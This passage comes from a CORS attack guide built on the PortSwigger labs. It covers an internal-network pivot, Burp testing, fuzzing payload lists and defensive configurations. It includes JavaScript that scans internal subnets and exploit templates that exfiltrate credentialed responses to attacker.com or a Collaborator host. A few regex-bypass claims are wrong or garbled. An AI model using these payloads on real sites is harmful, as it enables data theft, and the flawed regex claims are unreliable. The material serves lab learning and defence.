Response:
HTTP/1.1 302 Found
Location: /admin
```

### Why This Attack Works

1. **Browser as Proxy**: Victim's browser has access to internal network
2. **CORS Misconfiguration**: Internal service trusts same-origin requests (itself)
3. **XSS Entry Point**: Injected code executes in internal service context
4. **Same-Origin Policy**: Once XSS executes, it's same-origin with admin panel
5. **CSRF Token Accessible**: CORS allows reading admin panel HTML with token

### Real-World Implications

**Internal Network Assumptions:**
- "It's internal, so it's secure" is a dangerous mindset
- Internal services often have weaker security controls
- SSRF, CORS, and XSS can pivot through firewalls

**Common Vulnerable Scenarios:**
- Corporate intranets with overly permissive CORS
- Development servers accessible from internal network
- Admin panels without IP restrictions
- IoT devices and internal APIs

**Defense Gaps:**
- Perimeter security doesn't protect against browser-based attacks
- Internal network segregation ineffective against this vector
- Trust boundary violated by victim's browser

### Advanced Techniques

#### Faster Scanning with Parallel Requests

```javascript
var results = [];
var pending = 0;

for (var i = 1; i <= 254; i++) {
    pending++;
    var req = new XMLHttpRequest();
    req.open('get', 'http://192.168.0.' + i + ':8080/', true);
    req.timeout = 1000; // 1 second timeout
    req.ontimeout = function() { pending--; };
    req.onerror = function() { pending--; };
    req.onload = function() {
        var ip = this.responseURL.match(/192\.168\.0\.(\d+)/)[1];
        results.push(ip);
        pending--;
    };
    req.send();
}

// Wait for scans to complete
var checkComplete = setInterval(function() {
    if (pending === 0) {
        clearInterval(checkComplete);
        // Exploit first discovered host
        if (results.length > 0) {
            exploitHost('192.168.0.' + results[0]);
        }
    }
}, 100);
```

#### Port Scanning Extension

```javascript
var ports = [80, 443, 8080, 8443, 3000, 5000];
var discovered = {};

ports.forEach(function(port) {
    for (var i = 1; i <= 254; i++) {
        var req = new XMLHttpRequest();
        req.open('get', 'http://192.168.0.' + i + ':' + port + '/', true);
        req.onload = function() {
            var url = this.responseURL;
            var match = url.match(/192\.168\.0\.(\d+):(\d+)/);
            if (match) {
                var ip = match[1];
                var port = match[2];
                discovered[ip + ':' + port] = true;
            }
        };
        req.send();
    }
});
```

### Common Mistakes and Troubleshooting

1. **Scan Not Finding Host**:
   - Increase timeout for slower networks
   - Verify port 8080 is correct
   - Check browser console for errors
   - Use browser devtools Network tab to see requests

2. **XSS Not Executing**:
   - Verify injection point (username parameter)
   - Check URL encoding
   - Ensure `</script>` is split: `</scr'+'ipt>`
   - Test XSS independently first

3. **CORS Request Blocked**:
   - Confirm request is from internal origin
   - Check for typos in IP address
   - Verify relative URL paths

4. **CSRF Token Extraction Fails**:
   - Inspect admin panel HTML structure
   - Adjust regex pattern to match actual token format
   - Add logging: `console.log(html)` before extraction

5. **Delete Request Fails**:
   - Verify form field names (csrf, username)
   - Check HTTP method (POST vs GET)
   - Ensure `Content-Type: multipart/form-data`

### Key Takeaways

- Internal networks are **NOT immune** to web-based attacks
- Victim's browser acts as a **proxy** into internal infrastructure
- CORS misconfigurations + XSS = **complete internal network compromise**
- **Defense-in-depth** required: Fix CORS, XSS, and CSRF vulnerabilities
- Never trust internal origins blindly
- Implement proper **input validation** even for internal tools
- Use **network segmentation** and **zero-trust** architecture

### Prevention Strategies

1. **Restrict CORS to Specific Origins**:
```javascript
// Bad
res.setHeader('Access-Control-Allow-Origin', origin);

// Good
const allowedOrigins = ['https://trusted-domain.com'];
if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
}
```

2. **Never Trust Internal Network Alone**:
- Implement authentication on ALL services
- Use CSRF tokens even for internal apps
- Apply same security standards as public-facing apps

3. **Prevent XSS**:
- Input validation and sanitization
- Content Security Policy (CSP)
- Output encoding
- Use modern frameworks with auto-escaping

4. **Network Segmentation**:
- Isolate admin panels on separate VLANs
- Require VPN for internal access
- Implement IP whitelisting
- Use zero-trust architecture

---

## Attack Techniques Summary

### 1. Basic Origin Reflection

**Vulnerability**: Server reflects any Origin header without validation

**Exploitation**:
```javascript
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api/sensitive', true);
req.withCredentials = true;
req.onload = function() {
    // Exfiltrate data
    fetch('https://attacker.com/log?data=' + this.responseText);
};
req.send();
```

**Detection**:
- Test with arbitrary origin: `Origin: https://evil.com`
- Check if reflected in `Access-Control-Allow-Origin`
- Verify `Access-Control-Allow-Credentials: true`

### 2. Null Origin Exploitation

**Vulnerability**: Server trusts `Origin: null`

**Exploitation**:
```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="<script>
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api/data', true);
req.withCredentials = true;
req.onload = function() { parent.postMessage(this.responseText, '*'); };
req.send();
</script>"></iframe>
```

**Detection**:
- Send request with `Origin: null`
- Check for reflection in ACAO header

### 3. Subdomain Takeover

**Vulnerability**: CORS trusts all subdomains, attacker controls abandoned subdomain

**Exploitation**:
1. Find abandoned subdomain (old-api.victim.com)
2. Take over via DNS or expired service
3. Host exploit code on subdomain
4. Make CORS requests to main domain

**Detection**:
- Enumerate subdomains (subfinder, amass)
- Test for subdomain takeovers
- Check CORS policy with subdomain origins

### 4. Regex Bypass

**Vulnerability**: Whitelist uses flawed regex

**Common Flaws**:
```javascript
// Missing anchor - allows prefix
origin.match(/victim\.com/) // Bypassed by: victim.com.attacker.com

// Missing anchor - allows suffix
origin.match(/^victim\.com/) // Bypassed by: attacker-victim.com

// Character class error
origin.match(/victim.com/) // . matches any character
// Bypassed by: victimXcom.attacker.com
```

**Proper Regex**:
```javascript
origin.match(/^https:\/\/[\w-]+\.victim\.com$/)
```

### 5. Protocol Confusion

**Vulnerability**: CORS ignores protocol in origin validation

**Exploitation**:
1. Find XSS on HTTP subdomain
2. Inject CORS exploitation code
3. Request HTTPS main domain
4. CORS accepts HTTP origin

**Detection**:
- Test with `Origin: http://subdomain.victim.com`
- From HTTPS application

### 6. Wildcard with Credentials

**Vulnerability**: `Access-Control-Allow-Origin: *` with sensitive data

**Note**: Cannot be exploited with credentials (`withCredentials: true`), but if authentication is via custom headers or URL parameters, still vulnerable

**Exploitation**:
```javascript
// If auth is via URL parameter
fetch('https://victim.com/api?token=STOLEN-TOKEN')
    .then(r => r.text())
    .then(data => fetch('https://attacker.com/?data=' + data));
```

### 7. Pre-Domain Wildcard

**Vulnerability**: `Access-Control-Allow-Origin: *`subdomain.victim.com``

**Exploitation**:
- Register `attacker-subdomain.victim.com` as domain name
- Or exploit DNS rebinding

### 8. Post-Domain Wildcard

**Vulnerability**: Pattern matching allows `victim.com*`

**Exploitation**:
- Register `victim.com.attacker.com`
- Or use `victim.com.co` TLD

### 9. Internal Network Pivot

**Vulnerability**: CORS trusts internal network origins

**Exploitation**:
1. Victim visits attacker site
2. JavaScript scans internal network
3. Discovers internal service with XSS
4. XSS payload makes CORS requests
5. Exfiltrates internal data

### 10. Cache Poisoning

**Vulnerability**: CORS headers cached with reflected origin

**Exploitation**:
1. Send request with `Origin: https://attacker.com`
2. Response cached: `Access-Control-Allow-Origin: https://attacker.com`
3. Subsequent visitors get attacker's origin in CORS header
4. Attacker can now read responses

**Detection**:
- Check `Vary: Origin` header
- Test caching behavior with different origins

---

## Burp Suite Workflow

### 1. CORS Scanner Extension

**Installation**:
1. Go to Burp → Extender → BApp Store
2. Install "CORS*, Additional CORS Checks"
3. Or install "Trusted Domain CORS Scanner"

**Features**:
- Automatic origin reflection testing
- Regex bypass detection
- Null origin testing
- Protocol confusion checks

### 2. Manual Testing with Repeater

**Basic Test Workflow**:

1. **Find Authenticated Endpoint**:
   - Proxy browser traffic through Burp
   - Login and navigate application
   - Identify endpoints returning sensitive data

2. **Send to Repeater**:
   - Right-click request → "Send to Repeater"

3. **Test Origin Reflection**:
```http
GET /api/userdata HTTP/1.1
Host: victim.com
Origin: https://evil.com
Cookie: session=abc123
```

4. **Analyze Response**:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

{"username":"admin","apikey":"secret123"}
```

5. **Test Variations**:
   - `Origin: null`
   - `Origin: http://subdomain.victim.com`
   - `Origin: https://victim.com.attacker.com`
   - `Origin: https://victim。com` (Unicode bypass)

### 3. Intruder for Fuzzing

**Setup Origin Fuzzing**:

1. Send request to Intruder
2. Set attack position on Origin header:
```http
Origin: §https://test.com§
```

3. **Payload Lists**:

**Basic Bypass Payloads**:
```
null
https://victim.com
http://victim.com
https://subdomain.victim.com
https://victim.com.attacker.com
https://attackervictim.com
https://victim.com.attacker.com
https://victimXcom
```

**Protocol Variations**:
```
http://victim.com
https://victim.com
ftp://victim.com
file://victim.com
```

**Subdomain Brute Force**:
```
https://www.victim.com
https://api.victim.com
https://admin.victim.com
https://dev.victim.com
https://staging.victim.com
```

4. **Grep - Extract**:
   - Add grep rule: `Access-Control-Allow-Origin: (.*)`
   - Identifies which origins are accepted

### 4. Collaborator for Out-of-Band Testing

**Use Case**: Detect blind CORS vulnerabilities

```javascript
<script>
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api', true);
req.withCredentials = true;
req.onload = function() {
    // Send to Burp Collaborator
    var img = new Image();
    img.src = 'https://BURP-COLLABORATOR-ID.burpcollaborator.net/?data=' + btoa(this.responseText);
};
req.send();
</script>
```

**Workflow**:
1. Burp → Burp Collaborator client
2. Copy Collaborator URL
3. Inject in exploit
4. Poll for interactions

### 5. Generating CORS PoC

**Manual PoC Template**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC</title>
</head>
<body>
    <h1>CORS Vulnerability PoC</h1>
    <div id="output"></div>

    <script>
        var req = new XMLHttpRequest();
        req.onload = function() {
            document.getElementById('output').innerHTML = this.responseText;
        };
        req.open('get', 'https://victim.com/api/sensitive', true);
        req.withCredentials = true;
        req.send();
    </script>
</body>
</html>
```

**Burp Logger**:
1. Enable "Logger" tab (Burp v2023+)
2. Filter for CORS headers
3. Export findings

### 6. Testing Workflow Checklist

- [ ] Identify authenticated endpoints returning sensitive data
- [ ] Test with arbitrary origin (`https://evil.com`)
- [ ] Test with null origin
- [ ] Test with HTTP variant of HTTPS origin
- [ ] Test with subdomain origins
- [ ] Test with domain suffix/prefix
- [ ] Check for regex bypass opportunities
- [ ] Verify `Access-Control-Allow-Credentials: true`
- [ ] Check `Vary: Origin` header for caching issues
- [ ] Test preflight OPTIONS requests
- [ ] Verify exploit works end-to-end
- [ ] Document findings with PoC

### 7. Automated Scanning Configuration

**Burp Scanner Settings**:
1. Target → Site map
2. Right-click domain → "Scan"
3. Scan Configuration → "CORS" issues enabled
4. Review Dashboard for findings

**Scan Insertion Points**:
- Origin header
- Referer header
- X-Requested-With header

### 8. Advanced: Macro for Authenticated Scanning

**Problem**: Session expires during long scans

**Solution**: Setup session handling macro

1. Project options → Sessions → Macros
2. Add → Record login sequence
3. Configure token extraction from login response
4. Enable "Update session" for scanner requests

---

## References and Resources

### PortSwigger Resources

1. **Official Documentation**:
   - [What is CORS?](https://portswigger.net/web-security/cors)
   - [CORS Learning Path](https://portswigger.net/web-security/learning-paths/cors)
   - [All CORS Labs](https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors)

2. **Web Security Academy**:
   - [Lab: CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
   - [Lab: CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
   - [Lab: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
   - [Lab: CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)

3. **Burp Extensions**:
   - [CORS*, Additional CORS Checks](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
   - [Trusted Domain CORS Scanner](https://portswigger.net/bappstore/c257bcb0b6254a578535edb2dcee87d0)

### OWASP Resources

1. **Testing Guide**:
   - [Testing Cross Origin Resource Sharing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
   - [CORS OriginHeaderScrutiny](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)

2. **Cheat Sheets**:
   - [HTML5 Security - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
   - [HTTP Headers - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)

3. **Security Controls**:
   - [Cross-Origin Resource Policy (CORP)](https://owasp.org/www-community/controls/CrossOriginResourcePolicy)

### CVE Examples

1. **CVE-2024-8487** (AgentScope):
   - CORS misconfiguration allowing any external domain to access sensitive resources
   - Impact: Unauthorized data access, information disclosure
   - [GitHub Advisory](https://github.com/advisories/GHSA-75v5-6885-59f9)

2. **CVE-2024-8183** (Prefect):
   - CORS misconfiguration in prefecthq/prefect prior to v3.0.3
   - Impact: Unauthorized database access, data leaks, service disruption
   - Severity: High
   - [GitLab Advisory](https://advisories.gitlab.com/pkg/pypi/prefect/CVE-2024-8183/)

3. **CVE-2023-2465** (Google Chrome):
   - Inappropriate implementation in CORS
   - Remote attacker could leak cross-origin data via crafted HTML page
   - [Chrome Releases](https://chromereleases.googleblog.com/)

4. **CVE-2022-25227** (Thinfinity VNC):
   - CORS vulnerability allowing unprivileged remote attacker to obtain ID for websocket requests
   - Impact: Remote code execution
   - Version: v4.0.0.1

5. **CVE-2022-21817** (NVIDIA Omniverse Launcher):
   - CORS vulnerability allowing attackers to acquire access tokens
   - Impact: Access to resources in other security domains

### Research Papers & Articles

1. **Academic Research**:
   - "Postcards from the Post-XSS World" (Heiderich et al.)
   - "The Tangled Web: A Guide to Securing Modern Web Applications" (Zalewski)
   - "CORS in Action" (Hossain)

2. **Industry Blog Posts**:
   - [CORS Security: Beyond Basic Configuration](https://www.aikido.dev/blog/cors-security-beyond-basic-configuration)
   - [The Complete Guide to CORS (In)Security](https://www.bedefended.com/papers/cors-security-guide)
   - [CORS Vulnerabilities: Weaponizing permissive CORS configurations](https://outpost24.com/blog/exploiting-permissive-cors-configurations/)
   - [How to Securely Implement CORS](https://www.pivotpointsecurity.com/cross-origin-resource-sharing-security/)

3. **Vulnerability Databases**:
   - [CWE-942: Overly Permissive Cross-domain Whitelist](https://cwe.mitre.org/data/definitions/942.html)
   - [CAPEC-212: Functionality Misuse](https://capec.mitre.org/data/definitions/212.html)

### Tools & Automation

1. **Burp Suite Extensions**:
   - CORS* (Additional CORS Checks)
   - Trusted Domain CORS Scanner
   - BurpAPISecuritySuite (includes CORS testing)

2. **Standalone Tools**:
   - **Corsy**: Python-based CORS misconfiguration scanner
   - **CORScanner**: Fast CORS misconfiguration scanner
   - **CorsMe**: CORS exploitation tool
   - **OWASP ZAP**: Web app scanner with CORS detection

3. **Browser Extensions**:
   - **CORS Everywhere** (Firefox) - For testing CORS policies
   - **Allow CORS** (Chrome) - Bypass CORS for development

4. **Command-Line Testing**:
```bash
# cURL test
curl -H "Origin: https://attacker.com" \
     -H "Cookie: session=abc123" \
     -i https://victim.com/api/data

# Corsy scanner
python corsy.py -u https://victim.com

# CORScanner
python cors_scan.py -u https://victim.com -d
```

### Secure Coding Guidelines

1. **Best Practices**:
   - Never use wildcard (`*`) with credentials
   - Explicitly whitelist trusted origins
   - Validate protocol (HTTPS only)
   - Implement proper regex with anchors
   - Never trust `null` origin in production
   - Use `Vary: Origin` header for caching
   - Implement defense-in-depth

2. **Configuration Examples**:

**Node.js (Express)**:
```javascript
const allowedOrigins = ['https://trusted-domain.com'];

app.use((req, res, next) => {
    const origin = req.headers.origin;
    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
    }
    next();
});
```

**Python (Flask)**:
```python
from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)

allowed_origins = ['https://trusted-domain.com']

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')
    if origin in allowed_origins:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

**PHP**:
```php
$allowed_origins = ['https://trusted-domain.com'];
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (in_array($origin, $allowed_origins)) {
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Credentials: true");
}
```

### Standards & Specifications

1. **W3C Specifications**:
   - [Fetch Standard (CORS)](https://fetch.spec.whatwg.org/#http-cors-protocol)
   - [CORS Specification](https://www.w3.org/TR/cors/)

2. **IETF RFCs**:
   - RFC 6454: The Web Origin Concept
   - RFC 7231: HTTP/1.1 Semantics (Origin header)

3. **MITRE ATT&CK**:
   - T1189: Drive-by Compromise
   - T1071: Application Layer Protocol
   - T1567: Exfiltration Over Web Service

### Community Resources

1. **GitHub Repositories**:
   - [PortSwigger Additional CORS Checks](https://github.com/PortSwigger/additional-cors-checks)
   - [Awesome Burp Extensions - CORS](https://github.com/snoopysecurity/awesome-burp-extensions)
   - [CORS Vulnerability Examples](https://github.com/topics/cors-vulnerability)

2. **Bug Bounty Writeups**:
   - HackerOne disclosed reports
   - Bugcrowd vulnerability reports
   - Medium articles on CORS exploitation

3. **YouTube Channels**:
   - PortSwigger Web Security (Official)
   - PwnFunction (Security animations)
   - LiveOverflow (Security research)

### Pentesting Guides

1. **PortSwigger Solutions**:
   - [CORS vulnerability walkthrough by Frank Leitner](https://medium.com/@frank.leitner/write-up-cors-vulnerability-with-trusted-null-origin-portswigger-academy-94eb58b2d6f4)
   - [CORS labs solutions](https://anmolsinghthakur.medium.com/portswigger-cross-origin-resource-sharing-cors-75e3777b93cb)

2. **Testing Methodologies**:
   - [Pentesting CORS Vulnerabilities - Vidoc Security Lab](https://blog.vidocsecurity.com/blog/cross-origin-resource-sharing-vulnerabilities)
   - [CORS | Pentest Book](https://pentestbook.six2dez.com/enumeration/web/cors)

### Additional Learning

1. **Interactive Platforms**:
   - PortSwigger Web Security Academy (Free)
   - HackTheBox web challenges
   - TryHackMe CORS rooms

2. **Books**:
   - "The Tangled Web" by Michal Zalewski
   - "The Web Application Hacker's Handbook" by Stuttard & Pinto
   - "CORS in Action" by Monsur Hossain

3. **Conferences & Talks**:
   - DEF CON web security talks
   - OWASP AppSec conferences
   - Black Hat briefings on browser security

---

## Quick Reference Card

### CORS Headers Cheat Sheet

| Header | Purpose | Values |
|--------|---------|--------|
| `Access-Control-Allow-Origin` | Specifies allowed origin | `*`, `https://example.com`, `null` |
| `Access-Control-Allow-Credentials` | Allow credentials | `true`, `false` |
| `Access-Control-Allow-Methods` | Allowed HTTP methods | `GET, POST, PUT, DELETE` |
| `Access-Control-Allow-Headers` | Allowed request headers | `Content-Type, Authorization` |
| `Access-Control-Expose-Headers` | Headers accessible to JS | `X-Custom-Header` |
| `Access-Control-Max-Age` | Preflight cache duration | `86400` (seconds) |
| `Vary` | Cache control | `Origin` |

### Testing Commands

```bash
# Basic CORS test
curl -H "Origin: https://evil.com" -H "Cookie: session=abc" https://victim.com/api

# Null origin test
curl -H "Origin: null" -H "Cookie: session=abc" https://victim.com/api

# Protocol test
curl -H "Origin: http://victim.com" -H "Cookie: session=abc" https://victim.com/api
```

### Exploitation Template

```html
<script>
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api/data', true);
req.withCredentials = true;
req.onload = function() {
    fetch('https://attacker.com/exfil?data=' + btoa(this.responseText));
};
req.send();
</script>
```

### Common Vulnerable Patterns

| Pattern | Example | Bypass |
|---------|---------|--------|
| Regex without anchors | `victim\.com` | `victim.com.attacker.com` |
| Prefix match | `^victim\.com` | `victim.com.attacker.com` |
| Suffix match | `victim\.com$` | `attacker-victim.com` |
| Character class error | `victim.com` | `victimXcom.attacker.com` |
| Protocol agnostic | Any protocol accepted | Use HTTP subdomain |
| Null whitelist | Accepts `null` | Sandboxed iframe |
| Wildcard with creds | `*` + `true` | Use alt auth methods |

---

**End of CORS PortSwigger Labs Complete Guide**

*For updates and additional resources, visit: https://portswigger.net/web-security/cors*
